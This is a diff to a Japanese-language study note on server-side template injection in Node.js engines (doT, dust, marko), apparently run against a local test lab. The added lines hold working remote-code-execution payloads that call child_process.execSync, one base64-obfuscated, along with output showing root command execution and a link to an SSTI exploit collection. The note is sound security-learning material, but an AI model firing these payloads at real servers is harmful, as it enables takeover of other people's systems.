@@ -820,6 +820,12 @@ app.use('/dot', function(req, res){
 });
 ```
 わからん.   
+以下でRCE可能！   
+```txt
+/dot?inj={{=%20global.process.mainModule.require(%27child_process%27).execSync(%27id%27).toString()%20}}
+I59SiTdZt2tUfmpgRNTzp18Z3sOv5yUzuid=0(root) gid=0(root) groups=0(root)
+yiTceAbMxwuVYlveU6jqsV3kiwiqIIq2
+```
 #### dust
 ```js
 // Dust
@@ -855,6 +861,11 @@ ReferenceError: aaaout is not defined
     at /apps/tests/env_node_tests/connect-app.js:191:56
     at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
 ```
+ifヘルパーのevalインジェクションのやつ。dust-jsのバージョンによって動く。今回は動いてなさげ？？      
+```txt
+/dot?inj={@if cond="eval(Buffer('global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString()', 'base64').toString())"}{/if}
+ie15G7raBJOyjxAkv6KIrkx7OcLa5POx{@if cond="eval(Buffer('global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString()', 'base64').toString())"}{/if}JigcTwTBHoPSNxnugLJ79BMgruhMLUQt
+```
 #### marko
 ```js
 // Marko
@@ -883,6 +894,21 @@ SYRmrHgSweRm0BaVwR4d3xyXt6bi49qC<*></*>VtwiRsEOPnAdfCnUWqlIhTzF98oywEfo
 http://192.168.99.100:15004/marko?inj={7*7}
 Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx". Error(s) in template:
 1) [pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx:1:0] Unrecognized tag: {7*7} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag
+
+    at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
+    at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
+    at _compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:86:31)
+    at Object.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:112:10)
+    at doLoad (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:162:39)
+    at Object.load (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:47:14)
+    at /apps/tests/env_node_tests/connect-app.js:228:45
+    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
+```
+以下でRCEできるらしいけどなんかできてない…   
+```txt
+/marko?inj={{=global.process.mainModule.require('child_process').execSync('ls').toString()}}
+Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/Kh7NMWMQUQfgSl1VCpNe0qWLoCQoRBl5". Error(s) in template:
+1) [Kh7NMWMQUQfgSl1VCpNe0qWLoCQoRBl5:1:0] Unrecognized tag: {{=global.process.mainModule.require('child_process').execSync('ls').toString()}} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag
 
     at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
     at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
@@ -944,3 +970,5 @@ https://io.cyberdefense.jp/entry/2017/06/12/Server-Side_Template_Injection
 SSTIの説明。日本語。   
 https://ierae.co.jp/blog/osc2016do-webappsec/   
 SSTIの説明。日本語。   
+https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
+ここに大体のSSTIの脆弱なソースとそのExploitの例がある。神。   
